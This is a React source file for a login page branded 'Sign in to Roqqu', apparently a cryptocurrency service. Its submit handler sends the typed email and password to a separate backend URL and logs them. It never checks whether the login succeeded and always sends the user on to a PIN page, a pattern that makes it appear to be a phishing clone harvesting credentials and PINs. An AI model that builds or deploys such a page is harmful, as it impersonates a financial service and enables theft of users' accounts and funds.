import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/logo.png";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../component/FormErrMsg";
import { FiEye } from "react-icons/fi";
import { MdOutlineMail } from "react-icons/md";
import { TbLockFilled } from "react-icons/tb";
import { IoEyeOffOutline } from "react-icons/io5";
import axios from "axios";
import BASE_URL from "../component/urls";

const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup
    .string()
    .min(10, "Password must be at least 10 characters")
    .max(30, "Password cannot exceed 30 characters")
    .required("Password is required"),
});
const Index = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    axios.post(`${BASE_URL}/`, data);
    console.log(data);
    navigate("/pin");
  };

  const [passwordVisible, setPasswordVisible] = useState(false);

  const togglePasswordVisibility = () => {
    setPasswordVisible(!passwordVisible);
  };

  return (
    <>
      <div className="container">
        <header>
          <div className="logo">
            <img src={logo} alt="logo" />
          </div>
          <div className="content">
            <div className="title">Sign in to Roqqu</div>
            <div className="sub">
              You're one step away from something awesome
            </div>
          </div>
        </header>
        <section>
          <form onSubmit={handleSubmit(submitForm)}>
            <div className="inputs">
              <label>Email Address</label>
              <div className="input">
                <MdOutlineMail className="homeIcon" />
                <input
                  type="email"
                  name="email"
                  placeholder="Enter email"
                  required
                  {...register("email")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="email" />
              <label>Password</label>
              <div className="input password-input">
                <TbLockFilled className="homeIcon" />
                <input
                  type={passwordVisible ? "text" : "password"}
                  name="password"
                  placeholder="Enter password"
                  required
                  {...register("password")}
                />
                <span onClick={togglePasswordVisibility} className="eye-icon">
                  {passwordVisible ? <IoEyeOffOutline /> : <FiEye />}
                </span>
              </div>
              <FormErrMsg errors={errors} inputName="password" />
            </div>
            <div className="forgot-password">
              <a href="#">Forgot Password?</a>
            </div>
            <div className="sign-in-button">
              <button type="submit">Sign In</button>
            </div>
          </form>
        </section>
      </div>
    </>
  );
};

export default Index;
